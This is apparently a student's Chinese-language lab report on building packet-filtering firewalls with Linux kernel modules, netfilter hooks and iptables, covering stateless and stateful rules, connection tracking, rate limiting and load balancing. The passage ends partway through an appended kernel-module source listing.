      <title>Firewall Exploration Lab</title>
      <link href="/2022/12/10/Firewall_ex/"/>
      <url>/2022/12/10/Firewall_ex/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>本实验的学习目标有两个:了解防火墙如何工作，并建立一个简单的防火墙对于一个网络。学生们将首先实现一个简单的无状态包过滤防火墙，它检查数据包，并根据防火墙规则决定是否丢弃或转发数据包。通过这个实现任务，让学生了解防火墙的基本工作原理。</p><span id="more"></span><p>实际上，Linux已经有一个内置的防火墙，也是基于netfilter的。这个防火墙叫做iptables。学生将得到一个简单的网络拓扑，并被要求使用iptables进行设置防火墙规则保护网络。学生们还将接触到其他一些有趣的应用iptables。本实验涵盖以下主题:</p><p>•防火墙</p><p>•Netfilter</p><p>•可加载的内核模块</p><p>•使用iptables设置防火墙规则</p><p>•iptables的各种应用</p><h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-防火墙"><a href="#2-1-防火墙" class="headerlink" title="2.1 防火墙"></a>2.1 防火墙</h3><p>在计算机领域中，防火墙是一种网络安全系统，它根据预定的安全规则监视和控制进出的网络流量。防火墙通常在可信网络和不可信网络(如Internet)之间建立一个屏障。</p><h3 id="2-2-netfilter"><a href="#2-2-netfilter" class="headerlink" title="2.2 netfilter"></a>2.2 netfilter</h3><p>Netfilter是Linux内核提供的一个框架，允许以定制处理程序的形式实现各种与网络相关的操作。Netfilter提供了包过滤、网络地址转换和端口转换的各种功能和操作，提供了在网络中定向数据包和禁止数据包到达网络中的敏感位置所需的功能。</p><p>Netfilter表示Linux内核中的一组钩子，允许特定的内核模块向内核的网络堆栈注册回调函数。这些函数通常以过滤和修改规则的形式应用于流量，在网络堆栈中对每个遍历各自钩子的数据包调用。</p><h3 id="2-3-iptables"><a href="#2-3-iptables" class="headerlink" title="2.3 iptables"></a>2.3 iptables</h3><p>iptables是一个用户空间实用程序，允许系统管理员配置Linux内核防火墙的IP包过滤规则，实现为不同的Netfilter模块。过滤器被组织在不同的表中，其中包含如何处理网络流量数据包的规则链。不同的协议目前使用不同的内核模块和程序;iptables适用于IPv4, ip6tables适用于IPv6, arptables适用于ARP, ebtables适用于以太网帧。</p><h3 id="2-4-拓扑搭建"><a href="#2-4-拓扑搭建" class="headerlink" title="2.4 拓扑搭建"></a>2.4 拓扑搭建</h3><p>在这个实验室里，我们需要使用多台机器。它们的设置如图1所示。我们将使用容器设置这个实验环境:</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181741261.png"></p><h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p><p>2．Docker.</p><h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Task-1-Implementing-a-Simple-Firewall"><a href="#4-1-Task-1-Implementing-a-Simple-Firewall" class="headerlink" title="4.1 Task 1: Implementing a Simple Firewall"></a>4.1 Task 1: Implementing a Simple Firewall</h3><p>在这个任务中，我们将实现一个简单的包过滤类型的防火墙，它检查每个传入的和并执行管理员设置的防火墙策略。</p><h4 id="4-1-1-Task-1-A-Implement-a-Simple-Kernel-Module"><a href="#4-1-1-Task-1-A-Implement-a-Simple-Kernel-Module" class="headerlink" title="4.1.1 Task 1.A: Implement a Simple Kernel Module"></a>4.1.1 Task 1.A: Implement a Simple Kernel Module</h4><p>LKM允许我们在运行时向内核添加一个新模块。这个新模块使我们能够扩展内核的功能，而不需要重新构建内核，甚至不需要重新启动计算机。防火墙的包过滤部分可以实现为LKM。在这个任务中，我们将熟悉LKM。</p><p>首先使用make命令对 kernel_module 中的文件进行编译如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181741767.png"></p><p>在该目录下，使用lsmod命令即可查看当前所生成的module 如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181741259.png"></p><p>使用dmesg -w命令进行监听：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181742735.png"></p><p>使用 insmod 命令，插入 hello.ko 如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181742970.png"></p><p>使用rmmod命令移除 hello这个module，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181742894.png"></p><p>在使用dmesg监听的窗口可以观察内核中的输出结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181742024.png"></p><h4 id="4-1-2-Task-1-B-Implement-a-Simple-Firewall-Using-Netfilter"><a href="#4-1-2-Task-1-B-Implement-a-Simple-Firewall-Using-Netfilter" class="headerlink" title="4.1.2 Task 1.B: Implement a Simple Firewall Using Netfilter"></a>4.1.2 Task 1.B: Implement a Simple Firewall Using Netfilter</h4><p>本任务中需要使用LKM和Netfilter实现包过滤模块。这个模块将从数据结构中获取防火墙策略，并使用这些策略来决定数据包是否应该被挡。</p><p>实现两个更多的钩子，以达到以下目的:(1)防止其他计算机ping(2)防止其他计算机telnet到虚拟机。请实施两种不同的挂钩函数，但是将它们注册到同一个netfilter钩子。</p><p>首先利用dig去产生UDP包发送给8.8.8.8，可以发现其正常发送，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181743232.png"></p><p>编译packet_filter中的文件并且插入seedfilter.ko，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181743722.png"></p><p>在dmesg所监听的窗口中，可以观察到过滤文件被成功注册：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181743355.png"></p><p>然后重新使用dig命令发送UDP包给8.8.8.8，观察到发送超时，服务不可达：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181743845.png"></p><p>同时在监听窗口，可以观察到如下内容：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181743516.png"></p><p>说明由当前主机发送8.8.8.8的UDP包均被丢弃，说明过滤规则生效。</p><p>移除当前的过滤器，把hook函数都添加到代码中后，重新编译并且添加module，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181744418.png"></p><p>重新使用dig @8.8.8.8 <a href="http://www.example.com命令发送UDP包，可以在dmesg的监听窗口观察到如下内容：">www.example.com命令发送UDP包，可以在dmesg的监听窗口观察到如下内容：</a></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181744866.png"></p><p>从中可以发现，POST_ROUTING,PRE_ROUTING在当前主机给8.8.8.8发送UDP数据包的时候被调用，而LOCAL_IN,LOCAL_OUT在8.8.8.8给当前主机发送响应UDP的时候被调用。</p><p>经过查询可以得到NF_INET_FORWARD函数的主要功能是查路由，决定数据包是输入到本地还是转发，因此可以推断得知其在发送给路由器的时候被调用。</p><p>移除当前的过滤器，在HOST-A主机中尝试ping命令和telnet命令与当前主机建立连接，发现均可以成功响应，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181744655.png"></p><p>修改代码添加过滤规则后重新编译，并且添加模块，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181744126.png"></p><p>HOST-A主机中，重新向当前主机发送ping和telnet，均失败：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181744490.png"></p><p>与此同时，在dmesg所监听的窗口中，可以观察到如下内容：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181747662.png"></p><p>说明，当前发送给当前主机的ping响应和建立telnet连接的tcp包均被丢弃，设置的过滤规则成功生效。</p><h3 id="4-2-Task-2-Experimenting-with-Stateless-Firewall-Rules"><a href="#4-2-Task-2-Experimenting-with-Stateless-Firewall-Rules" class="headerlink" title="4.2 Task 2: Experimenting with Stateless Firewall Rules"></a>4.2 Task 2: Experimenting with Stateless Firewall Rules</h3><p>在前面的任务中，我们有机会使用netfilter构建一个简单的防火墙。实际上,Linux已经有内置防火墙，也是基于netfilter的。这个防火墙叫做iptables。从技术上讲,防火墙的内核部分实现被称为Xtables，而iptables是一个用户空间程序配置防火墙。然而，iptables通常用于指内核部分实现还有用户空间程序。</p><h4 id="4-2-1-Task-2-A-Protecting-the-Router"><a href="#4-2-1-Task-2-A-Protecting-the-Router" class="headerlink" title="4.2.1 Task 2.A: Protecting the Router"></a>4.2.1 Task 2.A: Protecting the Router</h4><p>在这个任务中，我们将设置规则来阻止外部机器访问路由器机器，ping除外。</p><p>根据实验所搭建的网络拓扑我们可以得知，路由器拥有两个IP地址，分别用于与其内网 192.168.60.00&#x2F;24和外网10.9.0.0&#x2F;24 进行通信。</p><p>在设置防火墙规则前，我们在host-a主机中，可以与路由器进行ping和telnet连接，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181748565.png"></p><p>然后依次执行实验手册中所给出的四个指令：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181748597.png"></p><p>查看iptables中过滤表中的规则：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181748482.png"></p><p>重新在host-a主机中与路由器进行ping和telnet连接，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181749042.png"></p><p>发现ping可以成功，而telnet连接建立失败，说明所设置的防火墙过滤规则成功将外部机器所访问路由器的方式限制为了ping。原因在于所设置的规则，只允许路由器的输入为icmp echo-request类型的报文和输出为icmp echo-reply类型的报文被接收，其他报文均丢弃。</p><h4 id="4-2-2-Task-2-B-Protecting-the-Internal-Network"><a href="#4-2-2-Task-2-B-Protecting-the-Internal-Network" class="headerlink" title="4.2.2 Task 2.B: Protecting the Internal Network"></a>4.2.2 Task 2.B: Protecting the Internal Network</h4><p>在这个任务中，我们想要实现一个防火墙来保护内部网络。更具体地说，我们需要对ICMP报文流量进行如下限制:</p><p>1. 外部主机无法ping通内部主机。</p><p>2. 外部主机可以ping通路由器。</p><p>3.内部主机可以ping外部主机。</p><p>4. 内部网络和外部网络之间的所有其他数据包都应该被阻止</p><p>实验步骤如下：</p><p>首先清空路由器中之前所设置的规则，然后重新在过滤表中设置规则如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181749404.png"></p><p>解释说明，只允许eth1进行转发进来的icmp响应请求报文，只允许eth0进来的进行转发icmp响应回复报文，而响应请求报文均被丢弃，其他报文均不允许被转发。其中eth1所对应ip为内网，而eth1所对应ip为外网。</p><p>在host-a主机中，分别ping 路由器和host-1，以及与host-1建立telnet连接，可以观察到如下现象：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181749019.png"></p><p>1主机中分别尝试ping host-a和telnet host-a，现象如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181749315.png"></p><p>解释：</p><p>在外部主机中，可以成功ping路由器，但不可以与内部主机进行ping以及telnet连接，；在内部主机中，可以成功ping外部主机，但不能与外部主机建立telnet连接，符合任务中的要求。</p><h4 id="4-2-3-Task-2-C-Protecting-Internal-Servers"><a href="#4-2-3-Task-2-C-Protecting-Internal-Servers" class="headerlink" title="4.2.3 Task 2.C: Protecting Internal Servers"></a>4.2.3 Task 2.C: Protecting Internal Servers</h4><p>在这个任务中，我们希望保护内部网络(192.168.60.0&#x2F;24)内的TCP服务器。更多的</p><p>具体来说，我们要实现以下目标。</p><p>1. 所有内部主机都运行一个telnet服务器(监听端口23)。外部主机只能访问telnet服务器位于192.168.60.5，而不是其他内部主机</p><p>2. 外部主机无法访问其他内部服务器。</p><p>3.内部主机可以访问所有内部服务器。</p><p>4. 内部主机无法访问外部服务器。</p><p>实验步骤：</p><p>首先进行检查如下：</p><p>在host-a中分别与内网中的三台主机建立telnet连接，发现均可以成功。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181750831.png"></p><p>在host-1中与外部主机建立telnet连接，也可以成功。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181750864.png"></p><p>修改过滤表中的规则如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181750202.png"></p><p>让所有从外部进来并且访问目的主机为host-1的 23端口的tcp报文被接收，让所有来自于内网host-1并且源端口为23的tcp报文被接受，其余报文均被丢弃</p><p>修改规则后，重新在各种主机中尝试建立telnet连接如下：</p><p>在host-1中，可以成功与内网中的其他主机以及外网主机建立连接：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181751693.png"></p><p>在host-a中，只可以与内网中host-1建立连接：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181751828.png"></p><p>在host2中，可以与内网中的其他主机建立连接，但不可以与外网主机建立连接：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181752682.png"></p><p>尝试在主机a中采用其他的连接方式：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181752466.png"></p><p>发现在主机1中不会收到信息。</p><p>因此证明符合任务中所给出的规则。</p><h3 id="4-3-Task-3-Connection-Tracking-and-Stateful-Firewall"><a href="#4-3-Task-3-Connection-Tracking-and-Stateful-Firewall" class="headerlink" title="4.3 Task 3: Connection Tracking and Stateful Firewall"></a>4.3 Task 3: Connection Tracking and Stateful Firewall</h3><h4 id="4-3-1-Task-3-A-Experiment-with-the-Connection-Tracking"><a href="#4-3-1-Task-3-A-Experiment-with-the-Connection-Tracking" class="headerlink" title="4.3.1 Task 3.A: Experiment with the Connection Tracking"></a>4.3.1 Task 3.A: Experiment with the Connection Tracking</h4><p>为了支持有状态防火墙，我们需要能够跟踪连接。这是通过内核内部的conntrack机制实现的。在本次任务中，我们将进行与该模块相关的实验，并熟悉连接跟踪制。在我们的实验中，我们将检查连接跟踪路由器容器的信息。可以使用以下命令来成：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181752781.png"></p><p>本任务的目标是通过一系列实验来帮助学生理解这种跟踪机制中的连接概念，特别是对于ICMP和UDP协议，因为与TCP不同，它们没有连接。请进行以下实验。对于每个实验，请描述你的观察结果，并附上解释。</p><p>ICMP实验，</p><p>在主机A中向主机1发送icmp报文如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181752410.png"></p><p>然后在路由器中可以查看到信息如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181753557.png"></p><p>可以观察到其中所保存的icmp信息会在一段时间后消失，其具体保留时间内，可以在路由器中的如下文件中得知：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181753177.png"></p><p>可以发现其保留时间为30s</p><p>UDP实验：</p><p>在主机A和主机1中利用nc建立一个udp链接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181753979.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181753388.png"></p><p>然后在路由器中可以观察到如下记录，及其保留时间：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181754334.png"></p><p>可以得知udp报文在路由器中的保留时间为30s</p><p>TCP实验：</p><p>在主机A和主机1中建立TCP连接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181754020.png"></p><p>在路由器中可以观察到所保存的TCP报文信息如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181754673.png"></p><p>保留时间如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181754864.png"></p><p>建立连接时会保留432000s，断开连接后，路由器中信息如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181754167.png"></p><p>可以观察到，断开连接后路由器中保留的信息会等待120s</p><h4 id="4-3-2-Task-3-B-Setting-Up-a-Stateful-Firewall"><a href="#4-3-2-Task-3-B-Setting-Up-a-Stateful-Firewall" class="headerlink" title="4.3.2 Task 3.B: Setting Up a Stateful Firewall"></a>4.3.2 Task 3.B: Setting Up a Stateful Firewall</h4><p>请在Task 2.C中重写防火墙规则，但这一次，我们将添加一条允许内部主机访问任何外部服务器(这在任务2.C中不允许)。</p><p>在路由器的容器中修改防火墙规则如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181755131.png"></p><p>然后再局域网中对所修改的规则及其作用进行验证如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181755709.png"></p><p>外部主机只能连接主机1：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181755376.png"></p><p>内网主机可以连接内网主机以及外网主机：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181756792.png"></p><p>如果采用nc来在主机A和主机1中建立连接，可以观察到如下现象：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181756152.png"></p><p>如果是TCP报文会被丢弃，但UDP报文则可以发送与接收</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181756076.png"></p><p>另一种实现的过滤规则如下：</p><p>通过测试同样可以，得到相同的效果</p><h3 id="4-4-Task-4-Limiting-Network-Traffic"><a href="#4-4-Task-4-Limiting-Network-Traffic" class="headerlink" title="4.4 Task 4: Limiting Network Traffic"></a>4.4 Task 4: Limiting Network Traffic</h3><p>除了阻断数据包外，我们还可以限制可以通过防火墙的数据包数量。这可以使用iptables的limit模块来完成。在这个任务中，我们将使用这个模块来限制如何操作。请在路由器上运行以下命令，然后从10.9.0.5 ping 192.168.60.5。描述你的观察。请在有和没有第二条规则的情况下进行实验，然后解释第二条规则是否需要，以及为什么</p><p>首先根据实验手册设置过滤规则如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181756127.png"></p><p>从主机A ping 主机1：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181756704.png"></p><p>可以发现icmp报文的发送被限制了，一部分报文被丢弃</p><p>如果去掉第二条规则，就会得到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181757353.png"></p><p>Icmp报文的转发并不会被限制</p><p>原因在于第一条规则设置了来自于主机A流量的限制是允许接收这么多，如果不设置第二条规则，来自于主机A的流量仍然会全部接收并转发，因此要利用第二条规则使其他来自于主机A的流量全部被丢弃，才能够真正的限制流量的转发。</p><h3 id="4-5-Task-5-Load-Balancing"><a href="#4-5-Task-5-Load-Balancing" class="headerlink" title="4.5 Task 5: Load Balancing"></a>4.5 Task 5: Load Balancing</h3><p>首先在三台主机中均打开如下服务：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181757908.png"></p><p><strong>Using the nth mode (round-robin).</strong></p><p>在路由器中设置对于目的主机为主机1的报文限制如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181757454.png"></p><p>同理设置对于对于主机2和主机3的报文限制分别为every2 packet0 和every1 packe0 ，即可对收到的报文均分，得到如下结果：</p><p>当从主机A向路由器不断发送报文时，在三台主机中接收到的效果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181757713.png"></p><p>在主机1中可以接收到每3个报文中的第一个报文：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181758340.png"></p><p>在主机2中可以接收到每三个报文中的第二个报文：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181758674.png"></p><p>在主机3中可以接收到每三个报文中的第三个报文</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181758064.png"></p><p><strong>Using the random mode.</strong></p><p>在路由其中设置如下规则：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181758348.png"></p><p>其原理是通过得到的概率来进行报文的均分，分别讲三台主机得到报文的概率设置为1，0.5，和1&#x2F;3即可以让每三个报文中的一个报文发给概率为1的主机，而其他两个报文根据概率分配给剩下两台主机，效果如下：</p><p>首先在主机A中向路由器发送六个UDP报文</p><p>如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181759934.png"></p><p>后在监听的三台主机中观察如下现象：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181759705.png"></p><p>可以观察到报文被均分发送到三个主机。</p><h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五. 附件"></a>五. 附件</h2><h3 id="5-1-Task-1-A—Hello-c"><a href="#5-1-Task-1-A—Hello-c" class="headerlink" title="5.1 Task 1.A—Hello.c"></a>5.1 Task 1.A—Hello.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">initialization</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Bye-bye World!.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(initialization);</span><br><span class="line">module_exit(cleanup);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="5-2-Task1-B—SeedBlock-c"><a href="#5-2-Task1-B—SeedBlock-c" class="headerlink" title="5.2 Task1.B—SeedBlock.c"></a>5.2 Task1.B—SeedBlock.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/icmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/inet.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> <span class="title">hook1</span>,<span class="title">hook2</span>,<span class="title">hook3</span>,<span class="title">hook4</span>;</span></span><br><span class="line"><span class="comment">// block ping to 10.9.0.1</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">blockICMP</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                       <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmphdr</span> *<span class="title">icmph</span>;</span></span><br><span class="line">    <span class="comment">// u16 port = 53; // icmp no port</span></span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>] = <span class="string">&quot;10.9.0.1&quot;</span>;</span><br><span class="line">    u32 ip_addr;</span><br><span class="line">    <span class="keyword">if</span> (!skb) <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">    iph = ip_hdr(skb);</span><br><span 